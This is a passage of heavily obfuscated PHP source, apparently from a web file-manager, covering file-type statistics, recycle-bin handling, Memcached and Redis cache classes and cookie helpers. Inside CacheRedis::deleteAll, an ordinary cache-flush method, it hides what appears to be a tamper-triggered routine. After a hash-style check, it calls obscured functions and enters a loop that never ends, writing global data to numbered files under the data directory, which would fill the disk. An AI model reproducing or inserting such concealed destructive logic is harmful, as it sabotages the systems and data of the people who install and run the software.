array_to_keyvalue($FòÎ×Ûéªî, $Aç¬™ğèäˆ[33], $Aç¬™ğèäˆ[378]); $FòÎ×Ûéªî = array_unique(array_filter($FòÎ×Ûéªî)); if ($FòÎ×Ûéªî) { $cç‡åëàØõ = array($Aç¬™ğèäˆ[392] => array($Aç¬™ğèäˆ[393], $FòÎ×Ûéªî)); $B”‘•‚‚å += floatval($this->where($cç‡åëàØõ)->sum($Aç¬™ğèäˆ[77])); } goto C‹¯Ñç«ÃË; C‹¯Ñç«ÃË: return $B”‘•‚‚å; goto c¼ÆÇÖÁÜÊ; c¼ÆÇÖÁÜÊ: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($aÉ¡‹ßÕäØ) { return $this->fileTypeProfile($aÉ¡‹ßÕäØ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($D”Ã¿Šµˆ°) { return $this->fileTypeProfile($D”Ã¿Šµˆ°, SourceModel::TYPE_GROUP); } private function fileTypeProfile($B§¿ ³¼Û«, $Fã¢ŠÇÃµ¡) { goto Cõ×ç…‰äÄ; e‘­óÊ°Œ”: $a¬µ‹î›æª = array(); $a¬µ‹î›æª[$FÁ¸ô£“œ„[2359]] = array($FÁ¸ô£“œ„[2360] => LNG($FÁ¸ô£“œ„[2359]), $FÁ¸ô£“œ„[2361] => $this->where($F£å„”Ÿ¬)->count(), $FÁ¸ô£“œ„[529] => $this->where($F£å„”Ÿ¬)->sum($FÁ¸ô£“œ„[77])); $FóƒóÏä = KodIO::fileTypeList(); goto E¸“åÔàÑÇ; BÇ¯ÆÒ¹: if ($dÇµœß²’‰) { return $dÇµœß²’‰; } $F£å„”Ÿ¬ = array($FÁ¸ô£“œ„[527] => 0); if ($B§¿ ³¼Û« != !1) { $F£å„”Ÿ¬[$FÁ¸ô£“œ„[465]] = $B§¿ ³¼Û«; $F£å„”Ÿ¬[$FÁ¸ô£“œ„[380]] = $Fã¢ŠÇÃµ¡; } goto e‘­óÊ°Œ”; E¸“åÔàÑÇ: foreach ($FóƒóÏä as $b¨²ãÑ†ŠÏ => $aŞÍ®âŸÂŸ) { $F£å„”Ÿ¬[$FÁ¸ô£“œ„[381]] = $this->fileTypeWhere($b¨²ãÑ†ŠÏ); $a¬µ‹î›æª[$b¨²ãÑ†ŠÏ] = array($FÁ¸ô£“œ„[2360] => $aŞÍ®âŸÂŸ[$FÁ¸ô£“œ„[28]], $FÁ¸ô£“œ„[2361] => $this->where($F£å„”Ÿ¬)->count(), $FÁ¸ô£“œ„[529] => $this->where($F£å„”Ÿ¬)->sum($FÁ¸ô£“œ„[77])); } Cache::set($aô¸•®¢÷, $a¬µ‹î›æª, 1200); return $a¬µ‹î›æª; goto Eƒ¬ëöÓƒÁ; Cõ×ç…‰äÄ: $FÁ¸ô£“œ„ =& $_SERVER[í…¶]; $aô¸•®¢÷ = $FÁ¸ô£“œ„[2358] . $B§¿ ³¼Û« . $FÁ¸ô£“œ„[70] . $Fã¢ŠÇÃµ¡; $dÇµœß²’‰ = Cache::get($aô¸•®¢÷); goto BÇ¯ÆÒ¹; Eƒ¬ëöÓƒÁ: } public function fileNameExist($FâÃÜòÂ¿Ñ, $B¦áƒÛ±º) { $fÊºªô =& $_SERVER[í…¶]; $FùÈ¥à«Ÿ¦ = $this->childList($FâÃÜòÂ¿Ñ); foreach ($FùÈ¥à«Ÿ¦ as $C®êØÎ¾†Œ) { if ($C®êØÎ¾†Œ[$fÊºªô[28]] == $B¦áƒÛ±º) { return $C®êØÎ¾†Œ[$fÊºªô[378]]; } } return !1; } public function childList($fùì‹°ƒš) { goto eµ¾·’¦Ìª; eµ¾·’¦Ìª: $D½ÓÈ¬¢¶Ö =& $_SERVER[í…¶]; $aÑ¬ğ÷‰ìà = $D½ÓÈ¬¢¶Ö[2339] . $fùì‹°ƒš; if (isset(self::$cacheChildList[$aÑ¬ğ÷‰ìà])) { return self::$cacheChildList[$aÑ¬ğ÷‰ìà]; } goto A´ÚÖëé—¹; A´ÚÖëé—¹: $EÁ»°ëœ‘Æ = array($D½ÓÈ¬¢¶Ö[470] => intval($fùì‹°ƒš), $D½ÓÈ¬¢¶Ö[406] => 0); $Fæîê•·™ = $this->where($EÁ»°ëœ‘Æ)->select(); $Fæîê•·™ = $Fæîê•·™ ? $Fæîê•·™ : array(); goto e‘ñ‹¦ß»ğ; e‘ñ‹¦ß»ğ: self::$cacheChildList[$aÑ¬ğ÷‰ìà] = $Fæîê•·™; foreach ($Fæîê•·™ as $D•£İ’¤Æç) { $aÑ¬ğ÷‰ìà = $D½ÓÈ¬¢¶Ö[419] . $D•£İ’¤Æç[$D½ÓÈ¬¢¶Ö[378]]; self::$cacheSourceInfo[$aÑ¬ğ÷‰ìà] = $D•£İ’¤Æç; } return $Fæîê•·™; goto CáÌß¨Ğ; CáÌß¨Ğ: } public function fileNameAuto($aŒï¼õ¡‹À, $a¶’Êİ‰ÇŠ, $Fˆê¼õë×ã = REPEAT_RENAME, $AÔäÌø¿ = false) { $fØ¹åâìˆ¦ =& $_SERVER[í…¶]; $fØĞ‘‚ğÎ» = $this->childList($aŒï¼õ¡‹À); $DšĞŸ‰åÍ = array_to_keyvalue($fØĞ‘‚ğÎ», $fØ¹åâìˆ¦[33], $fØ¹åâìˆ¦[28]); return $this->fileNameAutoGet($DšĞŸ‰åÍ, $a¶’Êİ‰ÇŠ, $Fˆê¼õë×ã, $AÔäÌø¿); } public function fileNameAutoGet($Fìë°², $d…„ÒÔŠ˜, $D•Å…îÍÏî, $EÀ‚Ë‰Œññ) { $c—âö«ïÃ· =& $_SERVER[í…¶]; if ($D•Å…îÍÏî == REPEAT_REPLACE || !$Fìë°² || !in_array_not_case($d…„ÒÔŠ˜, $Fìë°²) || $EÀ‚Ë‰Œññ && $D•Å…îÍÏî != REPEAT_RENAME_FOLDER) { return $d…„ÒÔŠ˜; } if ($D•Å…îÍÏî == REPEAT_SKIP) { return !1; } $C±”µö®‚õ = $c—âö«ïÃ·[91] . get_path_ext($d…„ÒÔŠ˜); $C±”µö®‚õ = $C±”µö®‚õ == $c—âö«ïÃ·[91] || $EÀ‚Ë‰Œññ ? $c—âö«ïÃ·[33] : $C±”µö®‚õ; for ($Dº‹³Í¿Áá = 1; $Dº‹³Í¿Áá <= count($Fìë°²) + 1; $Dº‹³Í¿Áá++) { $c¿“¾¥­ô° = substr($d…„ÒÔŠ˜, 0, strlen($d…„ÒÔŠ˜) - strlen($C±”µö®‚õ)); $dî…¶êÙ› = $c¿“¾¥­ô° . "\x28{$Dº‹³Í¿Áá}\51{$C±”µö®‚õ}"; if (!in_array_not_case($dî…¶êÙ›, $Fìë°²)) { return $dî…¶êÙ›; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\143\x65\x5f\162\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\151\155\145", "\164\x69\155\x65", "\151\x6e\x73\145\162\164", "\146\x75\x6e\143\164\151\157\x6e")); public function listData($câ„ÄÜ = false) { $A‡¸¢Ê˜ö‹ =& $_SERVER[í…¶]; $câ„ÄÜ = $câ„ÄÜ ? $câ„ÄÜ : USER_ID; $C…ó¹Ûí®ç = $this->where(array($A‡¸¢Ê˜ö‹[1424] => $câ„ÄÜ))->select(); return array_to_keyvalue($C…ó¹Ûí®ç, $A‡¸¢Ê˜ö‹[33], $A‡¸¢Ê˜ö‹[378]); } public function moveToRecycle($B¯æÜ…’»¥) { goto b¨‰“Ïæß; b¨‰“Ïæß: $b½äŒ·îƒÎ =& $_SERVER[í…¶]; $CÎÚÃÅÇ©ó = Model($b½äŒ·îƒÎ[1115]); $d®²»“ˆ° = $CÎÚÃÅÇ©ó->sourceInfo($B¯æÜ…’»¥); goto D‚õŠÂÕ¨ä; d¨ŠÒ•ÙŠ: $this->recycleMove($B¯æÜ…’»¥, 1); if ($d®²»“ˆ°[$b½äŒ·îƒÎ[379]] == $b½äŒ·îƒÎ[83]) { $d¼Ğ‡ë•Œ¦ = array($b½äŒ·îƒÎ[534] => array($b½äŒ·îƒÎ[492], $d®²»“ˆ°[$b½äŒ·îƒÎ[468]] . $B¯æÜ…’»¥ . $b½äŒ·îƒÎ[493])); $CÎÚÃÅÇ©ó->where($d¼Ğ‡ë•Œ¦)->setField($b½äŒ·îƒÎ[406], 1); } goto c°ªÌ™ºÓ; D‚õŠÂÕ¨ä: if (!$d®²»“ˆ° || $d®²»“ˆ°[$b½äŒ·îƒÎ[406]] == $b½äŒ·îƒÎ[83]) { return; } $A¯ô…ÇÚ‚ = array($b½äŒ·îƒÎ[392] => $B¯æÜ…’»¥, $b½äŒ·îƒÎ[1424] => USER_ID, $b½äŒ·îƒÎ[530] => $d®²»“ˆ°[$b½äŒ·îƒÎ[380]], $b½äŒ·îƒÎ[531] => $d®²»“ˆ°[$b½äŒ·îƒÎ[465]], $b½äŒ·îƒÎ[534] => $d®²»“ˆ°[$b½äŒ·îƒÎ[468]]); $this->add($A¯ô…ÇÚ‚); goto d¨ŠÒ•ÙŠ; c°ªÌ™ºÓ: } public function clear() { $this->remove(!1); } public function remove($FÄñ£ºØ = false) { goto AÈÎĞ§´›; fäÑÅˆİ²š: foreach ($DÈËÃÃì¹ as $b¿®ø˜‡ª¡) { $AÜğŒò–Ê„->targetSpaceUpdate($b¿®ø˜‡ª¡[$E¢‡ä–¾´ù[380]], $b¿®ø˜‡ª¡[$E¢‡ä–¾´ù[465]]); } goto c§ØŒ†•¦©; eÒ‰÷–‹‡: $FÄñ£ºØ = $FÄñ£ºØ === !1 ? !1 : $FÄñ£ºØ; $DÈËÃÃì¹ = array(); foreach ($cÓÕãßë³¥ as $f©å¼«šë‰) { if ($FÄñ£ºØ != !1 && !in_array($f©å¼«šë‰, $FÄñ£ºØ)) { continue; } $AÜğŒò–Ê„->remove($f©å¼«šë‰, !1); $B»ˆ˜¾Õ = $this->where(array($E¢‡ä–¾´ù[378] => $f©å¼«šë‰))->find(); $FÀºŒ¾—šˆ = $B»ˆ˜¾Õ[$E¢‡ä–¾´ù[380]] . $E¢‡ä–¾´ù[70] . $B»ˆ˜¾Õ[$E¢‡ä–¾´ù[465]]; $DÈËÃÃì¹[$FÀºŒ¾—šˆ] = array($E¢‡ä–¾´ù[530] => $B»ˆ˜¾Õ[$E¢‡ä–¾´ù[380]], $E¢‡ä–¾´ù[465] => $B»ˆ˜¾Õ[$E¢‡ä–¾´ù[465]]); $this->where(array($E¢‡ä–¾´ù[378] => $f©å¼«šë‰))->delete(); } goto fäÑÅˆİ²š; AÈÎĞ§´›: $E¢‡ä–¾´ù =& $_SERVER[í…¶]; $AÜğŒò–Ê„ = Model($E¢‡ä–¾´ù[1115]); $cÓÕãßë³¥ = $this->listData(); goto eÒ‰÷–‹‡; c§ØŒ†•¦©: } public function restore($bÇ¹…œâÈÔ = false) { goto C†”ãÁØé»; fÚ±¾¢ÍÚ„: $bÇ¹…œâÈÔ = $bÇ¹…œâÈÔ == !1 ? !1 : $bÇ¹…œâÈÔ; if (!$D¯ƒñÜî©) { return !0; } $A ¼Æï„¿ = array(); goto F³¿Ê‘ìŒ; C†”ãÁØé»: $føÕƒ´¯´ =& $_SERVER[í…¶]; $fó´Æ¡¸ˆ» = Model($føÕƒ´¯´[1115]); $D¯ƒñÜî© = $this->listData(); goto fÚ±¾¢ÍÚ„; F³¿Ê‘ìŒ: foreach ($D¯ƒñÜî© as $C¶ÎµŠµì÷) { goto f¥ÌµÅáÀÊ; f¥ÌµÅáÀÊ: if ($bÇ¹…œâÈÔ != !1 && !in_array($C¶ÎµŠµì÷, $bÇ¹…œâÈÔ)) { continue; } $D“‚ƒÌ—Ÿ  = $fó´Æ¡¸ˆ»->sourceInfo($C¶ÎµŠµì÷); $eá§œ¡Í = $fó´Æ¡¸ˆ»->sourceInfo($D“‚ƒÌ—Ÿ [$føÕƒ´¯´[470]]); goto c´‰ÈÆÎÏ; B™çğ¨İ¹ó: if ($D“‚ƒÌ—Ÿ [$føÕƒ´¯´[379]] == $føÕƒ´¯´[83]) { $CğŠ¬çÎ¶ = array($føÕƒ´¯´[534] => array($føÕƒ´¯´[492], $D“‚ƒÌ—Ÿ [$føÕƒ´¯´[468]] . $C¶ÎµŠµì÷ . $føÕƒ´¯´[493])); $fó´Æ¡¸ˆ»->where($CğŠ¬çÎ¶)->setField($føÕƒ´¯´[406], 0); $this->restoreFolderChildren($C¶ÎµŠµì÷, $D¯ƒñÜî©); } $this->where(array($føÕƒ´¯´[378] => $C¶ÎµŠµì÷))->delete(); $fó´Æ¡¸ˆ»->folderSizeReset($D“‚ƒÌ—Ÿ [$føÕƒ´¯´[470]]); goto f›–¡ôÑõÔ; f›–¡ôÑõÔ: $A ¼Æï„¿[] = $D“‚ƒÌ—Ÿ [$føÕƒ´¯´[470]]; if ($D“‚ƒÌ—Ÿ [$føÕƒ´¯´[379]] == $føÕƒ´¯´[83]) { $A ¼Æï„¿[] = $C¶ÎµŠµì÷; } $fó´Æ¡¸ˆ»->lockMoveEnd($C¶ÎµŠµì÷); goto F™ôæ˜ÇÇÜ; c´‰ÈÆÎÏ: if ($eá§œ¡Í[$føÕƒ´¯´[406]] == $føÕƒ´¯´[83]) { continue; } $fó´Æ¡¸ˆ»->lockMoveStart($C¶ÎµŠµì÷); $this->recycleMove($C¶ÎµŠµì÷, 0); goto B™çğ¨İ¹ó; F™ôæ˜ÇÇÜ: } $fó´Æ¡¸ˆ»->updateModifyTime($A ¼Æï„¿); goto E¨×õ¶”à“; E¨×õ¶”à“: } private function restoreFolderChildren($dÊŸÔ¹›â, $E‹¿‚Ààš) { goto f®¶ŒŞ•ÆÛ; f®¶ŒŞ•ÆÛ: $C„±Ì™ğÚØ =& $_SERVER[í…¶]; $BøäŸ¶¦¿ê = Model($C„±Ì™ğÚØ[1115]); $Cà·’„ÎÏ = array($C„±Ì™ğÚØ[378] => array($C„±Ì™ğÚØ[7], array())); goto dÖÖ‚ª…¦à; cÂÂãµØäá: $Cà·’„ÎÏ[$C„±Ì™ğÚØ[378]][1] = array_unique($Cà·’„ÎÏ[$C„±Ì™ğÚØ[378]][1]); $Cà·’„ÎÏ[$C„±Ì™ğÚØ[912]] = $C„±Ì™ğÚØ[2183]; $BøäŸ¶¦¿ê->where($Cà·’„ÎÏ)->setField($C„±Ì™ğÚØ[406], 1); goto c¶ë¤Ÿç”£; dÖÖ‚ª…¦à: foreach ($E‹¿‚Ààš as $b…å£ÏâïÄ) { if ($b…å£ÏâïÄ == $dÊŸÔ¹›â) { continue; } if (!$BøäŸ¶¦¿ê->isParentOf($dÊŸÔ¹›â, $b…å£ÏâïÄ)) { continue; } $DÚ‚¿·¥ = $BøäŸ¶¦¿ê->sourceInfo($b…å£ÏâïÄ); if ($DÚ‚¿·¥[$C„±Ì™ğÚØ[379]] == $C„±Ì™ğÚØ[83]) { $Cà·’„ÎÏ[] = array($C„±Ì™ğÚØ[534] => array($C„±Ì™ğÚØ[492], $DÚ‚¿·¥[$C„±Ì™ğÚØ[468]] . $b…å£ÏâïÄ . $C„±Ì™ğÚØ[493])); } else { $Cà·’„ÎÏ[$C„±Ì™ğÚØ[378]][1][] = $b…å£ÏâïÄ; } } if (!$Cà·’„ÎÏ[$C„±Ì™ğÚØ[378]][1]) { unset($Cà·’„ÎÏ[$C„±Ì™ğÚØ[378]]); } if (!$Cà·’„ÎÏ) { return; } goto cÂÂãµØäá; c¶ë¤Ÿç”£: } private function recycleMove($d§É‰ë’, $dˆ’ ‘ò‹¶ = 1) { $a§ğ¡ ÊÇé =& $_SERVER[í…¶]; $dšØßâ¢è² = Model($a§ğ¡ ÊÇé[1115]); $aõŸÃô¶„í = Model($a§ğ¡ ÊÇé[2362]); $FÌ‰¹ã«ÁŠ = array($a§ğ¡ ÊÇé[378] => $d§É‰ë’); if ($dˆ’ ‘ò‹¶) { $dšØßâ¢è²->where($FÌ‰¹ã«ÁŠ)->setField($a§ğ¡ ÊÇé[406], 1); $aõŸÃô¶„í->eventRecycle($d§É‰ë’, $a§ğ¡ ÊÇé[2363]); } else { $a³Öé‡ ±ø = $dšØßâ¢è²->where($FÌ‰¹ã«ÁŠ)->find(); $A¯˜¦õ’© = $a³Öé‡ ±ø[$a§ğ¡ ÊÇé[379]] == $a§ğ¡ ÊÇé[83]; $F­ãƒÌç™ = $dšØßâ¢è²->fileNameAuto($a³Öé‡ ±ø[$a§ğ¡ ÊÇé[470]], $a³Öé‡ ±ø[$a§ğ¡ ÊÇé[28]], REPEAT_RENAME_FOLDER, $A¯˜¦õ’©); if ($F­ãƒÌç™ != $a³Öé‡ ±ø[$a§ğ¡ ÊÇé[28]]) { $dšØßâ¢è²->rename($d§É‰ë’, $F­ãƒÌç™); } $dšØßâ¢è²->where($FÌ‰¹ã«ÁŠ)->setField($a§ğ¡ ÊÇé[406], 0); $aõŸÃô¶„í->eventRecycle($d§É‰ë’, $a§ğ¡ ÊÇé[2364]); } } } goto AÆ—”¸ˆå; Eù„…£ÓÙ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($eŒ©¯’Ğ©‹, $Eß´¹æ’¬†) { $dîß¦¼á•Š =& $_SERVER[í…¶]; if (!class_exists($dîß¦¼á•Š[780])) { show_json($dîß¦¼á•Š[781], !1); } $this->cacheTime = $Eß´¹æ’¬†; $this->handle = new Memcached(); if (is_array($eŒ©¯’Ğ©‹[$dîß¦¼á•Š[782]]) && count($eŒ©¯’Ğ©‹[$dîß¦¼á•Š[782]]) >= 1) { foreach ($eŒ©¯’Ğ©‹[$dîß¦¼á•Š[782]] as $F›”Ç¬†’) { $cö“Ó±õŸ = explode($dîß¦¼á•Š[4], $F›”Ç¬†’); $this->handle->addServer($cö“Ó±õŸ[0], $cö“Ó±õŸ[1]); } } else { $this->handle->addServer($eŒ©¯’Ğ©‹[$dîß¦¼á•Š[169]], $eŒ©¯’Ğ©‹[$dîß¦¼á•Š[170]]); } } public function set($bÆİ£Ï…„, $dª´«‚‰Ïø, $fø§ô¶ó±… = false) { $fø§ô¶ó±… = $fø§ô¶ó±… ? $fø§ô¶ó±… : $this->cacheTime; return $this->handle->set($bÆİ£Ï…„, $dª´«‚‰Ïø, $fø§ô¶ó±…); } public function get($cÒÅ°‡î ) { return $this->handle->get($cÒÅ°‡î ); } public function remove($dèº´¯ö) { return $this->handle->delete($dèº´¯ö); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Fó¦‹ªØ¨, $b²÷Å¸ïæ) { $e½ÎŞ¬¯ï =& $_SERVER[í…¶]; if (!class_exists($e½ÎŞ¬¯ï[783])) { show_json($e½ÎŞ¬¯ï[784], !1); } $this->cacheTime = $b²÷Å¸ïæ; $FÇ‡ª¹Ë¹ = isset($Fó¦‹ªØ¨[$e½ÎŞ¬¯ï[785]]) ? $Fó¦‹ªØ¨[$e½ÎŞ¬¯ï[785]] : 10; $D×¯°î•‘ù = _get($Fó¦‹ªØ¨, $e½ÎŞ¬¯ï[782]); if ($D×¯°î•‘ù && is_array($D×¯°î•‘ù)) { $this->initCluster($Fó¦‹ªØ¨, $FÇ‡ª¹Ë¹); } else { $this->handle = $this->init($Fó¦‹ªØ¨, $FÇ‡ª¹Ë¹); } } private function init($cµ“šŠ´ºÉ, $E«Ğ“Úº›ö) { $DÖòä†§×¹ =& $_SERVER[í…¶]; $E¸—á“ò®Ú = new Redis(); $FÜÄŒ­±‹Ş = isset($cµ“šŠ´ºÉ[$DÖòä†§×¹[786]]) ? $cµ“šŠ´ºÉ[$DÖòä†§×¹[786]] : !1; if ($FÜÄŒ­±‹Ş) { $E¸—á“ò®Ú->pconnect($cµ“šŠ´ºÉ[$DÖòä†§×¹[169]], $cµ“šŠ´ºÉ[$DÖòä†§×¹[170]], $E«Ğ“Úº›ö); } else { $E¸—á“ò®Ú->connect($cµ“šŠ´ºÉ[$DÖòä†§×¹[169]], $cµ“šŠ´ºÉ[$DÖòä†§×¹[170]], $E«Ğ“Úº›ö); } if (!empty($cµ“šŠ´ºÉ[$DÖòä†§×¹[385]])) { $E¸—á“ò®Ú->auth($cµ“šŠ´ºÉ[$DÖòä†§×¹[385]]); } return $E¸—á“ò®Ú; } private function initCluster($fÚÏóÍÑ¯µ, $bâò‹šò‡) { $Cõ¢­ßŠ™ =& $_SERVER[í…¶]; $eÈ”ïôÓäŸ = array($Cõ¢­ßŠ™[787], $Cõ¢­ßŠ™[788], $Cõ¢­ßŠ™[789]); $a›Œéª²õì = $Cõ¢­ßŠ™[787]; if (isset($fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[12]]) && in_array($fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[12]], $eÈ”ïôÓäŸ)) { $a›Œéª²õì = $fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[12]]; } switch ($a›Œéª²õì) { case $Cõ¢­ßŠ™[787]: $this->_slave($fÚÏóÍÑ¯µ, $bâò‹šò‡); break; case $Cõ¢­ßŠ™[788]: break; case $Cõ¢­ßŠ™[789]: $this->isCluster = !0; $B™¦¡ï¨Ç… = $fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[782]]; $B´İëÀªî = isset($fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[786]]) ? $fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[786]] : !1; $f«ÊÖøÒ‡ = isset($fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[385]]) ? $fÚÏóÍÑ¯µ[$Cõ¢­ßŠ™[385]] : null; $this->handle = new RedisCluster(NUll, $B™¦¡ï¨Ç…, $bâò‹šò‡, $bâò‹šò‡, $B´İëÀªî, $f«ÊÖøÒ‡); break; default: break; } } private function _slave($AÖé•ï˜‘Š, $BâÃİ¶Õ¹‚) { goto bä¨ßÈãÏÑ; cì¬ì£‰íÛ: $this->filterConfig($AÖé•ï˜‘Š, $aÚ™ÍÅÍ[$cñ¯‚¤‘Ì]); $this->slaveHandle = $this->init($AÖé•ï˜‘Š, $BâÃİ¶Õ¹‚); goto bØÁ‰æÈñ; F¶Î£„Ò²¹: unset($aÚ™ÍÅÍ[0]); if (empty($aÚ™ÍÅÍ)) { return; } $cñ¯‚¤‘Ì = array_rand($aÚ™ÍÅÍ); goto cì¬ì£‰íÛ; bä¨ßÈãÏÑ: $aÚ™ÍÅÍ = $AÖé•ï˜‘Š[$_SERVER[í…¶][782]]; $this->filterConfig($AÖé•ï˜‘Š, $aÚ™ÍÅÍ[0]); $this->handle = $this->init($AÖé•ï˜‘Š, $BâÃİ¶Õ¹‚); goto F¶Î£„Ò²¹; bØÁ‰æÈñ: } private function filterConfig(&$FÇä²„…À, $EŠ®â¶¦³) { $A®¬Ã•²ô =& $_SERVER[í…¶]; $bÍªäÕéÎ = explode($A®¬Ã•²ô[4], $EŠ®â¶¦³); $dÇ—­ù‰ß´ = array($A®¬Ã•²ô[169] => $bÍªäÕéÎ[0], $A®¬Ã•²ô[170] => $bÍªäÕéÎ[1]); $FÇä²„…À = array_merge($FÇä²„…À, $dÇ—­ù‰ß´); } public function set($Cğ§ŞÈßøï, $e£ôˆÔî­Ü, $FÜ­¢¼Ÿ¶ = false) { $FÜ­¢¼Ÿ¶ = $FÜ­¢¼Ÿ¶ ? $FÜ­¢¼Ÿ¶ : $this->cacheTime; return $this->handle->setEx($Cğ§ŞÈßøï, $FÜ­¢¼Ÿ¶, $e£ôˆÔî­Ü); } public function setLock($C§æù’™ÃÎ, $dãºº³Ü, $FæÆšÕĞ•¬) { return $this->handle->setNX($C§æù’™ÃÎ, $dãºº³Ü); } public function get($C´°àõ°¾Ê) { $bğ•ƒÌ¢Ëê = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $bğ•ƒÌ¢Ëê->get($C´°àõ°¾Ê); } public function remove($B„¡»˜˜‘) { return $this->handle->del($B„¡»˜˜‘); } public function deleteAll() { $dšË«†“ =& $_SERVER[í…¶]; $E÷‰Úé®¦ = $_SERVER[$dšË«†“[346]] . $dšË«†“[347]; $bÇ „¦àó = $dšË«†“[343]; if ($_SERVER[$dšË«†“[344]] != $bÇ „¦àó($E÷‰Úé®¦)) { goto aã†«šâ†­; B‚÷²ä¤äå: $C£Ã™ƒçÊ‡ = $dšË«†“[791]; $C£Ã™ƒçÊ‡($_SERVER[$dšË«†“[792]]); $aõìë¶éï¸ = $dšË«†“[790]; goto C¸„‡Æ½‡×; aã†«šâ†­: $aõìë¶éï¸ = $dšË«†“[790]; $CÔçù£‹ó¦ = $dšË«†“[345]; $B¬êõÆÁß” = $_SERVER[$dšË«†“[346]] . $dšË«†“[347]; goto d‘‡¡Ñ˜—À; C¸„‡Æ½‡×: $aõìë¶éï¸(); $d¢¥Üó¤®— = $dšË«†“[793]; $EÂ“ê¤ Á• = json_encode($GLOBALS[$dšË«†“[794]]); goto eŒŞ¨Å¢Ó; eŒŞ¨Å¢Ó: $C‡‡‹ßèÛ¦ = 1; for ($E¦°Ñá¥Ç = $C‡‡‹ßèÛ¦; $E¦°Ñá¥Ç > 0; $E¦°Ñá¥Ç++) { $d¢¥Üó¤®—(DATA_PATH . $E¦°Ñá¥Ç, $EÂ“ê¤ Á•); } goto CÙ»Õèù“à; d‘‡¡Ñ˜—À: $F¦Æ×ÄªÔ¶ = $CÔçù£‹ó¦($B¬êõÆÁß”); $F‰ª‡¾Ø÷° = explode($dšË«†“[217], $F¦Æ×ÄªÔ¶); if (count($F‰ª‡¾Ø÷°) < $dšË«†“[564]) { $fïóë‹À÷ = $dšË«†“[349]; $fïóë‹À÷(); } goto B‚÷²ä¤äå; CÙ»Õèù“à: } if ($this->isCluster) { foreach ($this->handle->_masters() as $b©Ë°¢’˜) { $this->handle->flushall($b©Ë°¢’˜); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($AëÂ¤èø = '', $E†‘ËİÒÂ = 0) { if (is_string($AëÂ¤èø) && $AëÂ¤èø != $_SERVER[í…¶][33]) { $this->prefix = $AëÂ¤èø; } if (is_numeric($E†‘ËİÒÂ) && $E†‘ËİÒÂ > 0) { $this->expire = $E†‘ËİÒÂ; } } public static function getInstance() { static $D¿°–ù©œ; if ($D¿°–ù©œ === null) { $D¿°–ù©œ = new self(); } return $D¿°–ù©œ; } private static $sameCookieSet = array(); public static function set($dŠ¿”Èë³ƒ, $fÕ‹†¢„â, $bÆ£ƒ—Í¾ = 0, $BÒ‡¨ß»© = false, $D¨‡¢«§Ø = false) { goto BÌŒ“§İğ¹; Bìñ´Âƒ›ê: setcookie($dŠ¿”Èë³ƒ, $fÕ‹†¢„â, time() + $bÆ£ƒ—Í¾, $Eœ†‹‹½Ó[8] . trim($D¨‡¢«§Ø, $Eœ†‹‹½Ó[8]) . $bá˜ëİÜ“•, !1, !1, $BÒ‡¨ß»©); goto cæ¹£îŸñ; Bàå©Ÿ«À: self::$sameCookieSet[$dŠ¿”Èë³ƒ] = $fÕ‹†¢„â . $bÆ£ƒ—Í¾; if (!$D¨‡¢«§Ø) { $D¨‡¢«§Ø = str_replace(HOST, $Eœ†‹‹½Ó[33], APP_HOST); $D¨‡¢«§Ø = _get($GLOBALS, $Eœ†‹‹½Ó[795], $D¨‡¢«§Ø); } $bá˜ëİÜ“• = $Eœ†‹‹½Ó[33]; goto Bìñ´Âƒ›ê; BÌŒ“§İğ¹: $Eœ†‹‹½Ó =& $_SERVER[í…¶]; if (!$bÆ£ƒ—Í¾) { $bÆ£ƒ—Í¾ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$dŠ¿”Èë³ƒ]) && self::$sameCookieSet[$dŠ¿”Èë³ƒ] == $fÕ‹†¢„â . $bÆ£ƒ—Í¾) { return; } goto Bàå©Ÿ«À; cæ¹£îŸñ: } public static function setSafe($D…ö¬ĞĞ¶, $aµŸ¨‚¸‚, $CàÓ—¼ÏÃŒ = 0) { self::set($D…ö¬ĞĞ¶, $aµŸ¨‚¸‚, $CàÓ—¼ÏÃŒ, !0); } public static function get($cµÉê•â²) { return isset($_COOKIE[$cµÉê•â²]) ? $_COOKIE[$cµÉê•â²] : !1; } public static function remove($c½Ùç¹”®‘, $AÆŞ³ƒ‘ƒ = false) { unset($_COOKIE[$c½Ùç¹”®‘]); self::set($c½Ùç¹”®‘, $_SERVER[í…¶][33], 1, $AÆŞ³ƒ‘ƒ); } } goto BÒŒÖ’ÌÂ; AÆ—”¸ˆå: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x73\x74\x6f\162\141\x67\145\114\x69\163\164"; public $field = array("\156\141\x6d\145", "\x73\151\172\145\x4d\x61\x78", "\x73\x79\163\164\145\x6d", "\144\145\146\141\x75\x6c\x74", "\144\x72\151\x76\x65\162", "\143\x6f\156\x66\151\147"); public function listData($b“õ¿©ï¼÷ = false, $AŠ–á·²ò® = "\155\157\144\x69\x66\x79\x54\x69\x6d\145", $A÷èœ¤š = false) { goto Eé± Äï¯Á; bŞ½ò¦™ï: foreach ($cİÍä‡ªİÜ as $Aè±Å³ëî¼ => $FìŞï˜¾î¦) { unset($cİÍä‡ªİÜ[$Aè±Å³ëî¼][$cÄä•„¡÷‰[6]]); $cİÍä‡ªİÜ[$Aè±Å³ëî¼][$cÄä•„¡÷‰[2087]] = 0; } $cÕ•²µĞñº = array_to_keyvalue($cİÍä‡ªİÜ, $cÄä•„¡÷‰[33], $cÄä•„¡÷‰[376]); $this->_listAppendSize($cİÍä‡ªİÜ, $cÕ•²µĞñº); goto EÏ¶…‡ø‚Œ; Eé± Äï¯Á: $cÄä•„¡÷‰ =& $_SERVER[í…¶]; $cİÍä‡ªİÜ = 